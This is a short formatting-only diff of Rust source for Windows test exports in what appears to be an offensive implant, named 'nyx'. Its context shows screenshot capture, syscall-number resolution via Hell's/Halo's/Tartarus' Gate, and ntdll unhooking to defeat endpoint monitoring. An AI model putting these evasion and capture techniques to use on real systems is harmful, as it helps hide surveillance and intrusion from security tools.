@@ -221,7 +221,9 @@ pub unsafe extern "system" fn nyx_screenshot_test() {
                 total_bytes = total_bytes.saturating_add(data.len());
             }
             crate::screenshot::Response::Err(s) => {
-                if err_str.is_none() { err_str = Some(s.as_str()); }
+                if err_str.is_none() {
+                    err_str = Some(s.as_str());
+                }
             }
             _ => {}
         }
@@ -246,7 +248,8 @@ pub unsafe extern "system" fn nyx_screenshot_test() {
     } else {
         crate::heap::String::from("0\n(no response)\n")
     };
-    let _ = crate::screenshot::capture_diag(b"C:\\Windows\\Temp\\nyx_shot_diag.txt\0", line.as_bytes());
+    let _ =
+        crate::screenshot::capture_diag(b"C:\\Windows\\Temp\\nyx_shot_diag.txt\0", line.as_bytes());
 
     let ok = err_str.is_none() && total_bytes > 0;
     if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
@@ -273,7 +276,9 @@ unsafe fn report_exit(exit_proc: Option<usize>, code: u32) -> ! {
         let f: extern "system" fn(u32) -> ! = core::mem::transmute(e);
         f(code);
     }
-    loop { core::hint::spin_loop(); }
+    loop {
+        core::hint::spin_loop();
+    }
 }
 
 #[no_mangle]
@@ -294,7 +299,9 @@ pub unsafe extern "system" fn nyx_selftest() {
     let _n_names: u32 = if export_rva != 0 {
         let dir = base.add(export_rva as usize) as *const crate::resolve::ExportDirectory;
         (*dir).number_of_names
-    } else { 0 };
+    } else {
+        0
+    };
 
     // === Phase 2: SSN resolution (allocates) ===
     // Exit 0x100 + N (N = resolved SSN count). Proves allocator + Hell/Halo/Tartarus.
@@ -374,9 +381,10 @@ pub unsafe extern "system" fn nyx_selftest_evasion() {
     };
     match crate::unhook::fresh_ntdll_text() {
         Some((fresh_base, text_rva, text_size)) => {
-            let diffs = crate::unhook::text_diff_count(fresh_base, hooked_base, text_rva, text_size);
+            let diffs =
+                crate::unhook::text_diff_count(fresh_base, hooked_base, text_rva, text_size);
             crate::unhook::unmap_fresh(fresh_base); // RAII not available across the match
-            // Report 0x0400 + D (cap D at 0x3FF to stay in the 0x04XX band).
+                                                    // Report 0x0400 + D (cap D at 0x3FF to stay in the 0x04XX band).
             let code = 0x0400 + (diffs.min(0x3FF) as u32);
             report_exit(exit_proc, code);
         }
